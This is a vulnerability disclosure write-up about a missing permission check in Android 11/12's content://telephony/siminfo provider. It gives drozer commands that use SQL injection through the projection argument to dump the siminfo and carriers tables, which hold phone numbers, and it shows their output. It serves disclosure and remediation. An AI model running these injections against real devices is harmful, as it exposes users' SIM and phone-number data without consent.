# Introduction to vulnerabilities

One of the components provided by the Android framework is Content Providers, which provide access to an apps database, usually stored within SQLite database files within the apps data directory. Content Providers are accessed via special URIs called Content URIs.

In the Uri of Android 11 and 12 content://telephony/siminfo There is a problem with permission settings in. An attacker can use this vulnerability to read the information of the local sim card through SQL injection, which contains sensitive information about phone number registration, causing sensitive data disclosure. Any other application installed on the device can take advantage of this, and these applications have the right to read sim card information.



# Testing environment

>Mobile phone brands: onepuls 9 pro, iQOO Z1, SAMSUNG S20
>
>Android version: Android 11, 12
>
>Root: None



# Test process

Use py2 to install the drozer server The apk client is installed on Android 11 and 12 phones.

The installation and use tutorial is shown in: https://www.cnblogs.com/goodhacker/p/3906180.html

Use the following command to test:

```
#Start drozer
adb forward tcp:31415 tcp:31415
drozer console connect 

#Execute command to test uri
run app.provider.query content://telephony/siminfo --projection "* FROM SQLITE_MASTER WHERE type='table';--"
run app.provider.query content://telephony/siminfo --projection "* FROM siminfo;--"
run app.provider.query content://telephony/siminfo --projection "* FROM carriers;--"
```

There are four tables in the database, as shown below,siminfo and carriers contain sensitive information

```java
dz> run app.provider.query content://telephony/siminfo --projection "* FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql                                                           | table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
| table | siminfo          | siminfo          | 4        | CREATE TABLE siminfo
| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
| table | carriers         | carriers         | 6        | CREATE TABLE carriers
```

Execute the following command to see all the information of the sim card, including the phone number (red circle marking) and sensitive information disclosure. content://telephony/siminfo Permission verification is missing. You can view the information in the database by executing SQL statements.



**run app.provider.query content://telephony/siminfo --projection "* FROM siminfo;--"**

![image-20221006163922261](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/202210061639306.png)

**run app.provider.query content://telephony/siminfo --projection "* FROM carriers;--"**

![image-20221007192143157](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/202210071921196.png)

Other vulnerability details refer to https://perspectiverisk.com/android-telephony-vulnerability/ï¼Œthe same vulnerability as CVE-2020-0060.

# Repair suggestions

Strengthen the right to content://telephony/siminfo Permission verification of

   